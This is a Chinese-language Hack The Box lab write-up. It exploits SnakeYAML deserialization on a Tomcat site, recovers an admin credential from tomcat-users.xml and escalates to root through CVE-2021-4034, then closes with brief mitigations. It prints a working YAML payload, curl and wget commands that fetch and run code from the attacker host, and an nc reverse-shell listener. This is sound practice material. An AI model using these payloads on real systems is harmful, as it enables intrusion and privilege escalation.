Hackthebox简介

Hackthebox是国外的在线靶场平台，通过平台特定的vpn进行连接，之后就可以进行靶场练习。在靶场中有两个flag，分别为用户权限的user.txt和管理员权限的root.txt。


本文简介

本文主要介绍了YAML反序列化漏洞的利用方式，cve-2021-4034提权漏洞的利用方式。提供了拿下一个服务器之后的信息搜集思路。


1

靶场环境


攻击机：kali liunx操作系统，IP为10.10.16.59。

靶机：linux操作系统，IP为10.129.96.171。


2

打靶过程


首先开启靶机，可以看到靶机的IP为10.129.96.171（此处因为笔者开的会员不同，靶机的IP也会与网上的有所不同）。


首先使用端口探测工具nmap进行扫描端口。


这个时候可以从端口扫描中信息中进行分析，在信息中发现靶机开了两个端口，一个是22端口的SSH，一个是8080端口的Web服务。同时扫描显示是Tomcat，这时可以知道这是个Java站点。


下一步进行访问8080端口。


当访问过来转到这个页面，在网站中找到了一个 YAML 解析器。YAML是一种人类可读的数据序列化语言。它通常用于配置文件和存储或传输数据的应用程序。


这个时候去判断是否可以使用反序列化漏洞来利用它。在谷歌进行漏洞的搜索，经过寻找发现在 Java 应用程序中使用的SnakeYAML容易被反序列化。


具体payload:

curl http://10.10.16.59/mash.sh -o /tmp/mash.shbash /tmp/mash.sh

*左右移动查看更多


这个payload的思路为让它在本地创建一个文件，然后执行它，在GitHub上搜索利用脚本。

利用这个脚本：

https://github.com/artsploit/yaml-payload

然后进行修改payload。


首先进入脚本文件夹

cd yaml-payload


然后编译脚本文件，生成一个java文件。

javac src/artsploit/AwesomeScriptEngineFactory.java

*左右移动查看更多



然后把它打包成一个jar。

jar -cvf yaml-payload.jar -C src/ .

*左右移动查看更多



在本地创建一个文件mash.sh

内容为：


此时开启python3 的http服务。

python3 -m http.server 80



首先开启nc监听，监听之前payload的端口。

nc -lvnp 12345


在之前YAML解析器的提交框上进行输入

 !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://10.10.16.59/yaml-payload.jar"] ]] ]

*左右移动查看更多


这时就可以监听到shell了。


输入命令id查看当前用户：


发现当前用户为tomcat。

并且这时发现打不开user.txt。


输入命令

ls -al



发现user.txt文件是属于用户admin的。


这时候的思路为前往tomcat 目录下寻找配置文件，试图寻找账号密码。


最后在/opt/tomcat/conf/tomcat-users.xml下发现账号密码。


adminwhythereisalimit


这时尝试利用SSH进行登录（这里本来是要有其他的提权方式，但新出的提权漏洞非常方便快捷）。


首先查看靶机是否存在python。

输入命令 python 。


发现存在python3。

用近期才爆出的漏洞进行提权 Linux Polkit本地权限提升漏洞

（cve-2021-4034）


3

漏洞描述


Polkit 是用于在类 Unix 操作系统中控制系统范围特权的组件。它为非特权进程提供了与特权进程进行通信的有组织的方式。


在靶机上输入命令

wget 10.10.16.59/root.py


把所需要的exp下载下来，利用python3执行即可。


执行完毕后，输入命令id，发现用户名为root，提权成功。


4

防护策略


1. 网站的测试页面不要出现在生产环境中，我们在开发过程中利用完后要及时进行删除。


2．cve-2021-4034的修复方案

临时解决方法, 将pkexec中的SUID-bit删除进行临时规避

chmod 0755 /usr/bin/pkexec


永久解决方法
